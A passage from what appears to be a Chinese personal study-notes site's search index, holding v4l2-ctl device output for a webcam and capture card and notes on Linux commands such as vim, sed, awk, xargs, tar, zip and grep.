<p>\u7b14\u8bb0\u672c\u81ea\u5e26\u6444\u50cf\u5934</p> <pre><code>root@tianyi \u279c  ~ v4l2-ctl -d /dev/video0 --all\nDriver Info:\n        Driver name      : uvcvideo\n        Card type        : EasyCamera: EasyCamera\n        Bus info         : usb-0000:00:14.0-5\n        Driver version   : 6.2.16\n        Capabilities     : 0x84a00001\n                Video Capture\n                Metadata Capture\n                Streaming\n                Extended Pix Format\n                Device Capabilities\n        Device Caps      : 0x04200001\n                Video Capture\n                Streaming\n                Extended Pix Format\n\nPriority: 2\nVideo input : 0 (Input 1: ok)\nFormat Video Capture:\n        Width/Height      : 640/480\n        Pixel Format      : 'YUYV' (YUYV 4:2:2)\n        Field             : None\n        Bytes per Line    : 1280\n        Size Image        : 614400\n        Colorspace        : sRGB\n        Transfer Function : Rec. 709\n        YCbCr/HSV Encoding: ITU-R 601\n        Quantization      : Default (maps to Limited Range)\n        Flags             :\nCrop Capability Video Capture:\n        Bounds      : Left 0, Top 0, Width 640, Height 480\n        Default     : Left 0, Top 0, Width 640, Height 480\n        Pixel Aspect: 1/1\nSelection Video Capture: crop_default, Left 0, Top 0, Width 640, Height 480, Flags:\nSelection Video Capture: crop_bounds, Left 0, Top 0, Width 640, Height 480, Flags:\nStreaming Parameters Video Capture:\n        Capabilities     : timeperframe\n        Frames per second: 30.000 (30/1)\n        Read buffers     : 0\n</code></pre> <p>\u91c7\u96c6\u5361</p> <pre><code>root@tianyi \u279c  ~ v4l2-ctl -d /dev/video2 --all\nDriver Info:\n        Driver name      : uvcvideo\n        Card type        : USB2 Video: USB2 Video\n        Bus info         : usb-0000:00:14.0-4\n        Driver version   : 6.2.16\n        Capabilities     : 0x84a00001\n                Video Capture\n                Metadata Capture\n                Streaming\n                Extended Pix Format\n                Device Capabilities\n        Device Caps      : 0x04200001\n                Video Capture\n                Streaming\n                Extended Pix Format\nPriority: 2\nVideo input : 0 (Input 1: ok)\nFormat Video Capture:\n        Width/Height      : 2560/1600\n        Pixel Format      : 'MJPG' (Motion-JPEG)\n        Field             : None\n        Bytes per Line    : 0\n        Size Image        : 8192000\n        Colorspace        : sRGB\n        Transfer Function : Rec. 709\n        YCbCr/HSV Encoding: ITU-R 601\n        Quantization      : Default (maps to Full Range)\n        Flags             :\nCrop Capability Video Capture:\n        Bounds      : Left 0, Top 0, Width 2560, Height 1600\n        Default     : Left 0, Top 0, Width 2560, Height 1600\n        Pixel Aspect: 1/1\nSelection Video Capture: crop_default, Left 0, Top 0, Width 2560, Height 1600, Flags:\nSelection Video Capture: crop_bounds, Left 0, Top 0, Width 2560, Height 1600, Flags:\nStreaming Parameters Video Capture:\n        Capabilities     : timeperframe\n        Frames per second: 30.000 (30/1)\n        Read buffers     : 0\n</code></pre>","tags":["tty"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/","title":"linux \u76f8\u5173-\u57fa\u672c\u547d\u4ee4","text":"<p>linux \u76f8\u5173</p>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#linux-\u547d\u4ee4-option-\u901a\u7528\u683c\u5f0f","title":"linux \u547d\u4ee4 option \u901a\u7528\u683c\u5f0f","text":"<ul> <li>POSIX-styled \u7684 option \u7531\u4e00\u4e2a dash \u548c\u4e00\u4e2a\u5b57\u7b26\u7ec4\u6210</li> <li>GNU-style \u7684 long option \u7531\u4e24\u4e2a dash \u548c\u4e00\u4e2a\u5173\u952e\u5b57 (keyword) \u7ec4\u6210<ul> <li>\u5173\u952e\u5b57\u80fd\u88ab\u7f29\u5199\uff0c\u53ea\u8981\u8db3\u591f\u533a\u5206\u4e0d\u540c\u5173\u952e\u5b57</li> <li>\u5982\u679c\u5173\u952e\u5b57\u9700\u8981\u4e00\u4e2a\u53c2\u6570 (argument)\uff0c\u53ef\u4ee5\u5728\u5173\u952e\u5b57\u540e\u7d27\u8ddf\u4e00\u4e2a\u7b49\u53f7=\uff0c\u7136\u540e\u7d27\u8ddf\u7740\u5173\u952e\u5b57\u7684\u503c\u3002\u6216\u8005\u5c06\u5173\u952e\u5b57\u548c\u503c\u7528\u7a7a\u767d\u5b57\u7b26 (whitespace) \u5206\u9694\u5f00\u3002</li> <li>\u5982\u679c\u5173\u952e\u5b57\u88ab\u591a\u6b21\u8d4b\u503c\uff0c\u5219\u4ee5\u6700\u540e\u4e00\u6b21\u7684\u4e3a\u51c6</li> </ul> </li> </ul> <p>man wget</p> <ul> <li>\u89e3\u6790\u65b9\u6cd5<ul> <li>GUN getopt</li> </ul> </li> <li>\u662f\u5426\u652f\u6301\u5408\u5e76</li> <li>\u662f\u5426\u652f\u6301\u9009\u9879\u653e\u5728\u53c2\u6570\u540e\u9762</li> <li><code>--</code>\u8868\u793a option \u7ed3\u675f\u3002Since the options can be specified after the arguments, you may terminate them with <code>--</code>.  So the following will try to download URL -x, reporting failure to log: <code>wget -o log -- -x</code></li> </ul>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#vim","title":"vim","text":"<p>Vim Cheat Sheet (rtorr.com)</p>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#\u57fa\u672c","title":"\u57fa\u672c","text":"<pre><code># insert mode\ni, o, O\n\n# \u5149\u6807\u79fb\u52a8\ni, j, k, l\ngg, G\nw, W, b, B # move word\n\n# \u590d\u5236\u7c98\u8d34\nyy, p\ndw # \u526a\u5207\u5355\u8bcd\n\n/pattern   # \u67e5\u627e\nn\n</code></pre>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#\u6dfb\u52a0-tab","title":"\u6dfb\u52a0 tab","text":"<ul> <li>ctrl-v \u8fdb\u5165 visual block \u6a21\u5f0f\uff08\u5982\u679c\u4f7f\u7528 windows terminal\uff0cctrl-v \u88ab\u8bbe\u7f6e\u4e3a\u7c98\u8d34\u4f1a\u5bfc\u81f4\u65e0\u6cd5\u8fdb\u5165\uff09\uff0c\u6216\u8005 shift-v \u8fdb\u5165 visual line \u6a21\u5f0f\u3002</li> <li>\"shift + dot\"\uff0c\u88ab\u9009\u4e2d\u7684\u884c\u4fbf\u4f1a tab \u4e00\u6b21\uff0c\u91cd\u590d\"dot\"\u53ef\u4ee5 tab \u4efb\u610f\u6b21<ul> <li>\u6216\u8005<code>:</code>\u8fdb\u5165\u547d\u4ee4\u6a21\u5f0f\uff0c<code>&gt;</code>\u5f80\u53f3 tab\uff0c<code>&lt;</code>\u5f80\u5de6 tab</li> </ul> </li> </ul> <p>\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\u547d\u4ee4\u6a21\u5f0f\uff0c\u4ee5\u4e0b\u547d\u4ee4\u5c06 1-5 \u884c\u5411\u53f3 tab 2 \u6b21</p> <pre><code>:1,5&gt;&gt;\n</code></pre>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#\u9ad8\u7ea7","title":"\u9ad8\u7ea7","text":"<p>\u5149\u6807\u79fb\u52a8</p> <pre><code>H, M, L # \u00a0top, middle, bottom of screen\n\nfx # jump to next occurrence of character x\n} # jump to next paragraph (or function/block, when editing code)\n{\n\nzz # center cursor on screen\n\nCtrl\u00a0+\u00a0b\u00a0- move back one full screen\nCtrl\u00a0+\u00a0f\u00a0- move forward one full screen\nCtrl\u00a0+\u00a0d\u00a0- move forward 1/2 a screen\nCtrl\u00a0+\u00a0u\u00a0- move back 1/2 a screen\n</code></pre> <p>\u67e5\u627e\u66ff\u6362</p> <ul> <li>%\u8868\u793a\u6574\u4e2a\u6587\u4ef6 range\uff08\u5426\u5219\u53ea\u4f1a\u66ff\u6362\u7b2c\u4e00\u6b21\u5339\u914d\uff09</li> </ul> <pre><code>:%s/xxx/yyy/g\n</code></pre>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#\u6267\u884c-shell-\u547d\u4ee4","title":"\u6267\u884c shell \u547d\u4ee4","text":"<pre><code>:!{cmd}\n\n:!ls -alh # \u67e5\u770b\u5f53\u524d\u76ee\u5f55\u4e0b\u6587\u4ef6\n\n:w !{cmd}   # buffer | cmd\n\n:%!{cmd}   # buffer | cmd | buffer\n:%!grep xxx  # \u8fc7\u6ee4\u6587\u4ef6\u5185\u5bb9\uff0c\u4fdd\u7559\u5339\u914d\u7684\u90e8\u5206\n</code></pre>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#\u5fd8\u8bb0-sudo","title":"\u5fd8\u8bb0 sudo","text":"<p>write with sudoHow does the vim \"write with sudo\" trick work? - Stack Overflow</p> <pre><code>:w !sudo tee %\n</code></pre> <ul> <li>w \u547d\u4ee4\u5b8c\u6574\u683c\u5f0f\uff1a<code>:[range]w[rite] [++opt] !{cmd}</code><ul> <li>\u8868\u793a\u6267\u884c cmd\uff0c\u5e76\u5c06\u5f53\u524d\u7f16\u8f91\u7f13\u51b2\u533a\u5185\u5bb9\u4f5c\u4e3a cmd \u8f93\u5165</li> <li>\u4f8b\u5b50<code>:w !grep xxx</code>\uff0cgrep \u6587\u4ef6\u5185\u5bb9</li> </ul> </li> <li><code>%</code>\uff1a\u8fd9\u91cc\u8868\u793a\u6587\u4ef6\u540d</li> <li>\u56e0\u6b64\u4e0a\u8ff0\u547d\u4ee4\u5c06 buffer \u5185\u5bb9 pipe \u7ed9 sudo \u6267\u884c\u7684 tee \u547d\u4ee4\uff0ctee \u547d\u4ee4\u5c06 stdin \u8f93\u51fa\u5230\u5f53\u524d\u6587\u4ef6\u548c stdout\uff0c\u4ece\u800c\u5b9e\u73b0\u5bf9\u6587\u4ef6\u7684\u5199\u5165\u3002</li> </ul> <p>\u4e3a\u4e0a\u8ff0\u547d\u4ee4\u8bbe\u7f6e\u522b\u540d w!!</p> <pre><code>\" Allow saving of files as sudo when I forgot to start vim using sudo.\ncmap w!! w !sudo tee &gt; /dev/null %\n</code></pre>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#\u7f16\u8f91\u4e8c\u8fdb\u5236\u6587\u4ef6","title":"\u7f16\u8f91\u4e8c\u8fdb\u5236\u6587\u4ef6","text":"<p>binary file - How can I use Vim as a hex editor? - Vi and Vim Stack Exchange</p> <p><code>:%!xxd</code></p> <ul> <li><code>:%!{cmd}</code>\u6709\u70b9\u50cf loopback\uff0c\u628a\u5f53\u524d\u7f13\u51b2\u533a pipe \u7ed9 cmd \u7136\u540e\u518d\u5c06\u5176\u8f93\u51fa\u5199\u56de\u5230\u7f13\u51b2\u533a\u3002</li> <li>xxd \u8f93\u5165\u4e8c\u8fdb\u5236\u8f93\u51fa hex \u6587\u672c</li> </ul> <p><code>:%!xxd -r</code></p> <ul> <li>xxd -r \u8f93\u5165 hex \u6587\u672c\u8f93\u51fa\u4e8c\u8fdb\u5236</li> </ul> <p><code>:wq</code> \u5199\u56de\u6587\u4ef6</p>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#\u914d\u7f6e\u6587\u4ef6","title":"\u914d\u7f6e\u6587\u4ef6","text":"<pre><code>map &lt;C-c&gt; \"+y&lt;CR&gt;\nmap &lt;C-v&gt; \"+p&lt;CR&gt;\n\ncommand! Vb normal! &lt;C-v&gt;\n\ncmap w!! w !sudo tee &gt; /dev/null %\n</code></pre> <p>\u81ea\u5b9a\u4e49\u547d\u4ee4\uff1akey bindings - Is there a command to enter Visual Block mode? - Vi and Vim Stack Exchange</p>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#cp-\u6ce8\u610f\u70b9","title":"cp \u6ce8\u610f\u70b9","text":"<ul> <li>cp file1 file2 ... dir</li> <li>cp -r dir1 dir2<ul> <li>\u5982\u679c dir2 \u5b58\u5728\uff0c\u5219\u5c06 dir1 \u590d\u5236\u5230 dir2 \u5185\uff0c\u5373 dir2/dir1</li> <li>\u5982\u679c dir2 \u4e0d\u5b58\u5728\uff0c\u5219\u5c06 dir1 \u590d\u5236\u4e3a dir2</li> </ul> </li> <li>cp dir1/* dir2<ul> <li>\u5c06 dir1 \u4e0b\u6240\u6709\u6587\u4ef6\u590d\u5236\u5230 dir2 \u5185\uff0c\u5982\u679c dir1 \u5b58\u5728\u76ee\u5f55\uff0c\u5219\u5e94\u6dfb\u52a0-r \u9009\u9879</li> </ul> </li> </ul>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#sed-awk-grep","title":"sed, awk, grep","text":"<p>\u8fd9\u4e9b\u547d\u4ee4\u8981\u6df1\u5165\u7814\u7a76\u7684\u8bdd\uff0c\u5185\u5bb9\u90fd\u5f88\u591a\u3002\u6bd4\u5982 awk \u53ef\u4ee5\u7b97\u662f\u4e00\u79cd\u7528\u4e8e\u5904\u7406\u6587\u672c\u7684\u89e3\u91ca\u578b\u7f16\u7a0b\u8bed\u8a00\u3002\u56e0\u6b64\uff0c\u6bd4\u8f83\u597d\u7684\u65b9\u6cd5\u662f\u4ece\u9700\u6c42\u51fa\u53d1\uff0c\u770b\u770b\u5728 linux \u4e0b\u4e00\u822c\u6709\u54ea\u4e9b\u6587\u5b57\u5904\u7406\u7684\u9700\u6c42\uff0c\u518d\u770b\u4f7f\u7528\u54ea\u79cd\u5de5\u5177\u6bd4\u8f83\u65b9\u4fbf\u7b80\u5355\u3002</p>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#\u547d\u4ee4\u683c\u5f0f","title":"\u547d\u4ee4\u683c\u5f0f","text":"<pre><code>grep [option] pattern file\n\nsed [options] 'command' file(s)\nsed [options] -f scriptfile file(s)\n\nawk [options] 'pattern {action}' [file]\n</code></pre>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#\u6b63\u5219\u8868\u8fbe\u5f0f","title":"\u6b63\u5219\u8868\u8fbe\u5f0f","text":"<p>\u57fa\u672c\u6b63\u5219\u8868\u8fbe\u5f0f\uff08Basic Regular Expressions\uff09\u548c\u6269\u5c55\u6b63\u5219\u8868\u8fbe\u5f0f\uff08Extended Regular Expressions\uff09\u662f\u4e24\u79cd POSIX \u6b63\u5219\u8868\u8fbe\u5f0f\u98ce\u683c\u3002</p> <p>BRE \u53ef\u80fd\u662f\u5982\u4eca\u6700\u8001\u7684\u6b63\u5219\u98ce\u683c\u4e86\uff0c\u5bf9\u4e8e\u90e8\u5206\u7279\u6b8a\u5b57\u7b26\uff08\u5982 <code>+</code>, <code>?</code>, <code>|</code>, <code>{</code>\uff09\u9700\u8981\u52a0\u4e0a\u8f6c\u4e49\u7b26 <code>\\</code> \u624d\u80fd\u8868\u8fbe\u5176\u7279\u6b8a\u542b\u4e49\u3002</p> <p>ERE \u4e0e\u5982\u4eca\u7684\u73b0\u4ee3\u6b63\u5219\u98ce\u683c\u8f83\u4e3a\u4e00\u81f4\uff0c\u76f8\u6bd4 BRE\uff0c\u4e0a\u8ff0\u7279\u6b8a\u5b57\u7b26\u9ed8\u8ba4\u53d1\u6325\u7279\u6b8a\u4f5c\u7528\uff0c\u52a0\u4e0a <code>\\</code> \u4e4b\u540e\u8868\u8fbe\u666e\u901a\u542b\u4e49\u3002</p>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#sed","title":"sed","text":"<ul> <li> <p>\u4fee\u6539\u6587\u4ef6\u4e2d\u67d0\u90e8\u5206\u5185\u5bb9\u3002\u4e00\u822c\u53ef\u4ee5\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5339\u914d\u5230\u5bf9\u5e94\u4f4d\u7f6e\uff0c\u7136\u540e\u8fdb\u884c\u4fee\u6539\u3002</p> <pre><code>//\u5c06\u6587\u4ef6\u4e2d\u6240\u6709\u7684 key=xxx\uff0c\u4fee\u6539\u4e3a key=${val}\n//-i \u8868\u793a\u5728\u539f\u6587\u4ef6\u4e0a\u4fee\u6539\uff0c\u53bb\u6389\u540e\u4f1a\u5c06\u7ed3\u679c\u8f93\u51fa\u5230\u547d\u4ee4\u884c\n// \u8fd9\u91cc\u8fd8\u7528\u5230\u4e86\u5b57\u7b26\u4e32\u62fc\u63a5\u8bed\u6cd5\uff0c\u5c06\u4e24\u4e2a\u5b57\u7b26\u4e32\u5199\u5230\u4e00\u8d77\u5c31\u4f1a\u62fc\u63a5\u3002\u5355\u5f15\u53f7\u5185\u4e0d\u80fd\u8fdb\u884c\u8f6c\u4e49\uff0c\u56e0\u6b64\u4e3a\u4e86\u4f7f\u7528\u53d8\u91cf val \u9700\u8981\u4f7f\u7528\u53cc\u5f15\u53f7\u3002\nsed -i 's/key=[0-9]+/'\"key=${val}/g\"\n</code></pre> <p>sed \u5176\u5b83\u547d\u4ee4\uff1a - s \u66ff\u6362 - d \u5220\u9664 - <code>c\\text</code> \uff1a\u9009\u5b9a\u884c\u6539\u6210\u65b0\u6587\u672c<code>text</code>   - \u5728\u5b9e\u9645\u4f7f\u7528\u4e2d\uff0c\u5982\u679c\u65b0\u6587\u672c\u9700\u8981\u8de8\u591a\u884c\uff0c\u6bcf\u4e00\u884c\u7684\u672b\u5c3e\uff08\u9664\u4e86\u6700\u540e\u4e00\u884c\uff09\u901a\u5e38\u9700\u8981\u52a0\u4e0a\u53cd\u659c\u7ebf\uff08<code>\\</code>\uff09 - a \u5f53\u524d\u884c\u4e0b\u63d2\u5165\u6587\u672c - i \u5f53\u524d\u884c\u4e0a\u63d2\u5165\u6587\u672c</p> <pre><code>//\u627e\u5230\u67d0\u4e00\u884c\uff0c\u7136\u540e\u6574\u884c\u66ff\u6362\nsed -i \"/config_pio_local_num_iotasks/ c\\config_pio_local_num_iotasks = 3\"\n</code></pre> </li> </ul>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#\u5730\u5740\u8303\u56f4\u5339\u914d\u6a21\u5f0f","title":"\u5730\u5740\u8303\u56f4\u5339\u914d\u6a21\u5f0f","text":"<p>sed /xxx/,/yyy/{ commands }</p> <ul> <li>\u8fd9\u91cc\u4f7f\u7528\u4e86 here document</li> <li>bash -s \u624d\u53ef\u4ee5\u6307\u4ee4\u8fd9\u6837\u7684\u591a\u884c\u811a\u672c</li> </ul> <pre><code>ssh $REMOTE \"bash -s\" &lt;&lt;EOF\nsed -i \"/$WG_PUB_KEY/,/^config/{\n    s/option endpoint_port.*/option endpoint_port '$PUBLIC_PORT'/\n    s/option endpoint_host.*/option endpoint_host '$PUBLIC_IP'/\n}\" \"/etc/config/network\"\n\n#wg set $WG_IF peer $WG_PUB_KEY endpoint $PUBLIC_IP:$PUBLIC_PORT\n\nifconfig $WG_IF down &amp;&amp; ifup $WG_IF\nEOF\n</code></pre>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#\u591a\u884c\u547d\u4ee4","title":"\u591a\u884c\u547d\u4ee4","text":"<pre><code>sed -i -e '/^port/c #port: 7890' -e '/^socks-port/c #socks-port: 7891' -e 's/^allow-lan.*/allow-lan: true/' -e '/^allow-lan/i mixed-port: 11223' glados.yaml\n</code></pre>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#\u66f4\u591a\u4f8b\u5b50","title":"\u66f4\u591a\u4f8b\u5b50","text":"<pre><code>sed -i '$a\\\\n' /tmp/grub.new # \u6587\u4ef6\u6700\u540e\u4e00\u884c\u6dfb\u52a0\u4e00\u884c\u6362\u884c\n</code></pre> <ul> <li><code>$</code>\u8868\u793a\u6700\u540e\u4e00\u884c</li> <li><code>a</code>\u8868\u793a\u5728\u6307\u5b9a\u884c\u540e\u9762\u6dfb\u52a0\u5185\u5bb9</li> </ul> <pre><code>sed -i ''${INSERTGRUB}'r /tmp/grub.new' $GRUBDIR/$GRUBFILE\n</code></pre> <ul> <li><code>r /tmp/grub.new</code>\uff1a\u8bfb\u53d6\u6587\u4ef6\u5185\u5bb9\u5e76\u63d2\u5165\u6307\u5b9a\u884c\u540e</li> </ul>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#awk","title":"awk","text":"<pre><code>awk -F'TXT' '{print $NF}' |xargs  # TXT\u4e3a\u5206\u9694\u7b26\uff0c$NF\u4e3a\u6700\u540e\u4e00\u5217\uff0cxargs\u53bb\u9664\u7a7a\u683c(strip\n</code></pre>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#\u5176\u5b83","title":"\u5176\u5b83","text":"","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#head-tail","title":"head, tail","text":"<pre><code>tail         # \u8f93\u51fa\u6700\u540e10\u884c\ntail -n k    # \u8f93\u51fa\u6700\u540ek\u884c\ntail -n +k   # \u8f93\u51fa\u4ece\u7b2ck\u884c\uff081\u5f00\u59cb\uff09\u7684\u6240\u6709\u884c\n\nhead         # \u8f93\u51fa\u524d10\u884c\nhead -n k    # \u8f93\u51fa\u524dk\u884c\nhead -n -k   # \u8f93\u51fa\u9664\u7ed3\u5c3ek\u884c\u540e\u7684\u6240\u6709\u884c\n</code></pre>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#xargs","title":"xargs","text":"<pre><code>xargs [options] [command [initial-arguments]]\n</code></pre> <p>\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u53d6 items\uff08\u4f7f\u7528 blank \u6216\u8005 newline \u5206\u9694\uff09\uff0c\u7136\u540e\u6267\u884c command\uff08\u9ed8\u8ba4/bin/echo\uff09\u3002\u4f7f\u7528 -n \u51b3\u5b9a\u6bcf\u6b21\u4f20\u9012\u591a\u5c11 iterm\u3002<code>-p</code> \u53ef\u4ee5\u770b\u5230\u6267\u884c\u7684\u5177\u4f53\u547d\u4ee4\uff0c\u5e76\u51b3\u5b9a\u662f\u5426\u6267\u884c\u3002</p> <pre><code>\u279c  ~ echo 1 2 3 4 5 6 7 8 9 | xargs -n 3 -p\necho 1 2 3?...\n</code></pre> <p>iterm \u4f1a\u63a5\u5728 command \u7ed3\u5c3e\uff0c\u5982\u679c\u60f3\u8981\u6307\u5b9a\u4f4d\u7f6e\uff0c\u9700\u8981\u6307\u5b9a replace str <code>-I{}</code></p> <pre><code>l \"/mnt/Disk2/BT/downloads/Video/TV_anime/\" | grep Juju | cut -d ' ' -f 9- | xargs -I {} rm -r \"/mnt/Disk2/BT/downloads/Video/TV_anime/{}\"\n</code></pre> <p>\u4e0d\u8fc7 <code>-I</code> \u9690\u542b\u4e86 <code>-L 1</code>\uff0c\u56e0\u6b64\u8f93\u5165\u4f1a\u6309\u7167\u6362\u884c\u5206\u9694\uff0c\u5e76\u4e14\u4e00\u6b21\u8f93\u5165\u4e00\u884c\u3002\uff08xargs \u5e76\u4e0d\u652f\u6301\u591a\u4e2a replace str\uff09</p> <p><code>--delimiter=delim, -d delim</code>\uff1a\u6307\u5b9a\u8f93\u5165\u7684\u5206\u9694\u7b26\uff0c\u5355\u4e2a\u5b57\u7b26\uff0c\u53ef\u4ee5\u662f C \u98ce\u683c\u7684\u5b57\u7b26\uff0c\u5982\u8f6c\u79fb\u5b57\u7b26\uff0c\u5b57\u7b26\u516b\u8fdb\u5236\u8868\u793a\u7b49\u3002</p>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#tar","title":"tar","text":"<p>archive - How do I tar a directory of files and folders without including the directory itself? - Stack Overflow</p> <pre><code>tar czf xxx.tar.gz -C &lt;dir&gt; .\n</code></pre> <ul> <li>-C : change the current directory</li> <li><code>.</code>: add the entire current directory</li> </ul>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#zip","title":"zip","text":"<pre><code>unzip file.zip  # \u89e3\u836f\u5230\u5f53\u524d\u76ee\u5f55\nunzip file.zip -d /path/to/dir\nunzip -l file.zip  # \u5217\u51fa\u6587\u4ef6\u5185\u5bb9\n\nzip -r file.zip /path/to/dir  # \u5c06\u76ee\u5f55\u538b\u7f29\uff0c\u5305\u542b\u9876\u5c42\u76ee\u5f55\nzip -r file.zip ./  # \u5c06\u5f53\u524d\u76ee\u5f55\u538b\u7f29\uff0c\u4e0d\u5305\u542b\u9876\u5c42\u76ee\u5f55\nzip -r file.zip ./*  # \u5c06\u5f53\u524d\u76ee\u5f55\u538b\u7f29\uff0c\u4e0d\u5305\u542b\u70b9\u6587\u4ef6\uff0c\u5982 .git\n</code></pre>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#cut","title":"cut","text":"<pre><code>for IPV6_SUBNET in $NET_IPV6_SUBNETS; do\nSRC=$(echo $IPV6_SUBNET | cut -d \"/\" -f 1)\"/128\"\n...\ndone\n</code></pre>","tags":["sed","awk","vim"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3-%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/#grep","title":"grep","text":"<ul> <li><code>-o</code>: only print matched part</li> </ul> <pre><code>iAddr=`ip addr show dev $interface |grep \"inet.*\" |head -n1 |grep -o '[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\/[0-9]\\{1,2\\}'`\n</code></pre> <p>\u67e5\u627e\u4e00\u4e2a\u76ee\u5f55\u4e2d\u7684\u6240\u6709\u6587\u4ef6</p> <pre><code>grep -r \"your_string\" 